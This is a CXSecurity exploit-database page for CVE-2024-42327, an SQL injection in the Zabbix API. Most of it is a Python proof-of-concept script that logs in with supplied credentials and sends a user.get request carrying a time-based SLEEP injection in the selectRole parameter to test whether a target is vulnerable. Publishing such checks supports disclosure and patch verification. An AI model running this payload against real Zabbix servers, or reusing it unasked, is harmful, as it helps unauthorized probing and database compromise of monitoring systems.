---
title: Zabbix 7.0.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025050003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-02
fetch_date: 2025-10-06T22:27:17.546023
---

# Zabbix 7.0.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zabbix 7.0.0 SQL Injection** **2025.05.01**  Credit:  **[Leandro Dias Barata](https://cxsecurity.com/author/Leandro%2BDias%2BBarata/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-42327](https://cxsecurity.com/cveshow/CVE-2024-42327/ "Click to see CVE-2024-42327")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Zabbix 7.0.0 - SQL Injection
# Date: 06/12/2024
# Exploit Author: Leandro Dias Barata @m4nb4
# Vendor Homepage: https://www.zabbix.com/
# Software Link: https://support.zabbix.com/browse/ZBX-25623
# Version: 6.0.0 - 6.0.31 / 6.0.32rc1 6.4.0 - 6.4.16 / 6.4.17rc1 7.0.0
# Tested on: Kali Linux kali-linux-2024.3
# CVE: CVE-2024-42327
import requests
import argparse
HEADERS = {"Content-Type": "application/json"}
def main():
parser = argparse.ArgumentParser(description="CHECK for CVE-2024-42327")
parser.add\_argument("-t", "--target", required=True, help="API URL")
parser.add\_argument("-u", "--username", required=True, help="Username")
parser.add\_argument("-p", "--password", required=True, help="Password")
args = parser.parse\_args()
url = f"{args.target.rstrip('/')}/api\_jsonrpc.php"
# Login to get the token
login\_data = {
"jsonrpc": "2.0",
"method": "user.login",
"params": {"username": args.username, "password": args.password},
"id": 1,
"auth": None
}
try:
login\_response = requests.post(url, json=login\_data, headers=HEADERS)
login\_response.raise\_for\_status()
auth\_token = login\_response.json().get("result")
# Simple SQLi test
data = {
"jsonrpc": "2.0",
"method": "user.get",
"params": {
"selectRole": ["roleid", "name", "type", "readonly AND (SELECT(SLEEP(5)))"],
"userids": ["1", "2"]
},
"id": 1,
"auth": auth\_token
}
test\_response = requests.post(url, json=data, headers=HEADERS)
test\_response.raise\_for\_status()
if "error" in test\_response.text:
print("[-] NOT VULNERABLE.")
else:
print("[!] VULNERABLE.")
except requests.RequestException as e:
print(f"[!] Request error: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top